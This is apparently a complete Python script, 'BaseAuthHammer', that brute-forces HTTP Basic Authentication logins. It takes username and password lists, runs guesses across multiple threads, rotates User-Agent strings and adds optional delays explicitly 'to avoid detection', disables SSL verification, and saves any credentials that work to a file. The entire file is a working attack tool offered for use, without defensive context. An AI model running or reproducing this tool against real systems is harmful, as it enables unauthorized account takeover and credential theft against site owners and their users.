import requests
import base64
import argparse
import sys
from colorama import init, Fore
import urllib3
import time
import threading
import random

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# List of random User-Agent headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36"
]

def print_banner():
    banner = """
888888b.                                    d8888          888    888      888    888                                                       
888  "88b                                  d88888          888    888      888    888                                                       
888  .88P                                 d88P888          888    888      888    888                                                       
8888888K.   8888b.  .d8888b   .d88b.     d88P 888 888  888 888888 88888b.  8888888888  8888b.  88888b.d88b.  88888b.d88b.   .d88b.  888d888 
888  "Y88b     "88b 88K      d8P  Y8b   d88P  888 888  888 888    888 "88b 888    888     "88b 888 "888 "88b 888 "888 "88b d8P  Y8b 888P"   
888    888 .d888888 "Y8888b. 88888888  d88P   888 888  888 888    888  888 888    888 .d888888 888  888  888 888  888  888 88888888 888     
888   d88P 888  888      X88 Y8b.     d8888888888 Y88b 888 Y88b.  888  888 888    888 888  888 888  888  888 888  888  888 Y8b.     888     
8888888P"  "Y888888  88888P'  "Y8888 d88P     888  "Y88888  "Y888 888  888 888    888 "Y888888 888  888  888 888  888  888  "Y8888  888     
"""
    print(Fore.CYAN + banner)
    print(Fore.YELLOW + "																	by Davidzzo23\n")

def read_passwords_from_file(file_path):
    with open(file_path, 'r') as file:
        return [password.strip() for password in file.readlines()]

def read_users_from_file(file_path):
    with open(file_path, 'r') as file:
        return [user.strip() for user in file.readlines()]

def log_success(username, password, output_file):
    with open(output_file, 'a') as f:
        f.write(f"Success: Username: {username}, Password: {password}\n")

def send_authenticated_get_request(url, username, password, proxies=None, output_file=None):
    # Encode username and password in base64
    credentials = f"{username}:{password}"
    encoded_credentials = base64.b64encode(credentials.encode('utf-8')).decode('utf-8')

    # Set up the headers with Basic Authentication and random User-Agent
    headers = {
        'Authorization': f'Basic {encoded_credentials}',
        'User-Agent': random.choice(USER_AGENTS)
    }

    # Send GET request with Basic Authentication
    response = requests.get(url, headers=headers, proxies=proxies, verify=False)

    # Check the response status
    if response.status_code == 200:
        print(Fore.GREEN + f"[+] Success: Username: {username}, Password: {password}")
        print(Fore.GREEN + "Response:")
        print(response.text)
        if output_file:
            log_success(username, password, output_file)
        return True  # Exit the loop if authentication succeeds
    else:
        print(Fore.RED + f"[-] Failed: Username: {username}, Password: {password}")
    return False

def worker(username, passwords, url, proxies, delay, output_file):
    for password in passwords:
        if send_authenticated_get_request(url, username, password, proxies=proxies, output_file=output_file):
            return
        time.sleep(delay)

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Perform brute-force attack with HTTP Basic Authentication.")
    parser.add_argument('-H', '--host', required=True, help="Target URL (e.g., http://www.example.com/login.php)")
    parser.add_argument('-u', '--user', help="Username to use for authentication")
    parser.add_argument('-U', '--userlist', help="Path to file containing list of usernames")
    parser.add_argument('-p', '--password', help="Password to use for authentication")
    parser.add_argument('-P', '--passfile', help="Path to file containing list of passwords")
    parser.add_argument('-x', action='store_true', help="Use proxy (http://127.0.0.1:8080)")
    parser.add_argument('-d', '--delay', type=float, default=0.0, help="Delay (in seconds) between requests to avoid detection")
    parser.add_argument('-t', '--threads', type=int, default=1, help="Number of threads for parallel execution")
    parser.add_argument('-o', '--output', help="File to save successful credentials")

    args = parser.parse_args()

    # Ensure mandatory arguments are provided
    if not args.user and not args.userlist:
        print(Fore.RED + "Error: Either --user or --userlist is required.")
        sys.exit(1)
    if not args.password and not args.passfile:
        print(Fore.RED + "Error: Either --password or --passfile is required.")
        sys.exit(1)

    # Set up proxies if -x is specified
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} if args.x else None

    # Load usernames and passwords based on provided options
    usernames = [args.user] if args.user else read_users_from_file(args.userlist)
    passwords = [args.password] if args.password else read_passwords_from_file(args.passfile)

    # Perform brute-force attack with multithreading
    threads = []
    for username in usernames:
        t = threading.Thread(target=worker, args=(username, passwords, args.host, proxies, args.delay, args.output))
        threads.append(t)
        t.start()

        if len(threads) >= args.threads:
            for t in threads:
                t.join()
            threads = []

    for t in threads:  # Final cleanup
        t.join()

if __name__ == '__main__':
    try:
        main()
    except argparse.ArgumentError:
        print(Fore.RED + "Error: Missing required arguments. Use -H, -u or -U, -p or -P to specify mandatory parameters.")
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Brute-force process interrupted by user.")
